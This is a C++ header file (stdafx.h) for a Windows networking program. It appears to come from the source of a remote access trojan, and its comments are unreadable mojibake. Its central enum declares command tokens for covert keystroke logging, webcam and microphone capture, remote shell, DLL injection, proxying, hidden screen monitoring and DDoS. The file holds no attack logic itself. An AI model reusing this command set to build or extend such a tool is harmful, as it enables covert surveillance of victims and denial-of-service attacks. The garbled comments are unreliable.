// stdafx.h : ��׼ϵͳ�����ļ��İ����ļ���
// ���Ǿ���ʹ�õ��������ĵ�
// �ض�����Ŀ�İ����ļ�
//
#pragma once
#define SAFE_DELETE(p) { if(p) { delete (p);   (p)=NULL; } }
#define SAFE_DELETE_AR(p) { if(p) { delete[] (p);   (p)=NULL; } }


#include "targetver.h"
#include <winsock2.h>
#include "windows.h"
#include <mswsock.h>
#include <MSTcpIP.h>

#pragma comment(lib, "ws2_32.lib")
#include <stdlib.h>
#include <stdio.h>
#include <tchar.h>
#include "process.h"
#include "ISocketBase.h"
#include "TcpSocket.h"
#include "UdpSocket.h"



// BYTE���Ҳ��256
enum MAIN
{
	TOKEN_CONDITION,			//���ݸ���
	TOKEN_ERROR,				//�ͻ��˷�����Ϣ
	TOKEN_PROCESS,				//����
	TOKEN_GNDESKTOP,			//�����ͼԤ��
	TOKEN_GETVERSION,			//��ȡ�汾
	TOKEN_SENDLL,				//����DLL����
	TOKEN_LOGIN,				//����

	TOKEN_DRIVE_LIST,			//�ļ�����
	TOKEN_WEBCAM_BITMAPINFO,	//����ͷ
	TOKEN_AUDIO_START,			//��˷�
	TOKEN_SPEAK_START,			//������
	TOKEN_KEYBOARD_START,		//���̼�¼
	TOKEN_PSLIST,				//ϵͳ����
	TOKEN_SHELL_START,			//Զ���ն�
	TOKEN_SYSINFOLIST,			//��������
	TOKEN_CHAT_START,			//Զ�̽�̸
	TOKEN_REGEDIT,				//ע������ 
	TOKEN_PROXY_START,			//����
	TOKEN_DDOS,					//ѹ������
	TOKEN_INJECT,				//ע�����

	TOKEN_MONITOR,				//��Ļ���
	TOKEN_BITMAPINFO_DIF,		//������Ļ
	TOKEN_BITMAPINFO_QUICK,		//������Ļ
	TOKEN_BITMAPINFO_PLAY,		//������Ļ
	TOKEN_BITMAPINFO_HIDE,		//��̨��Ļ



	TOKEN_KERNEL=100,			//��������


	TOKEN_EXPAND = 200,				//������չ���
	TOKEN_HEARTBEAT,				//����
	TOKEN_ACTIVED,					//����
	TOKEN_GETAUTODLL,				//�Զ�����

	TOKEN_NOTHING=255,				//0
};


#if _DEBUG
#include <iostream>
#endif


#define  TraceMAXSTRING    1024

inline void Trace(const  char* format, ...)
{
#if _DEBUG
#define  TraceEx _snprintf(szBuffer,TraceMAXSTRING,"%s(%d): ", \
     & strrchr(__FILE__, ' \\ ' )[ 1 ],__LINE__); \
    _RPT0(_CRT_WARN,szBuffer); \
    Trace
	static   char  szBuffer[TraceMAXSTRING];
	va_list args;
	va_start(args, format);
	int  nBuf;
	nBuf = _vsnprintf_s(szBuffer,
		TraceMAXSTRING,
		format,
		args);
	va_end(args);

	_RPT0(_CRT_WARN, szBuffer);
#endif

}

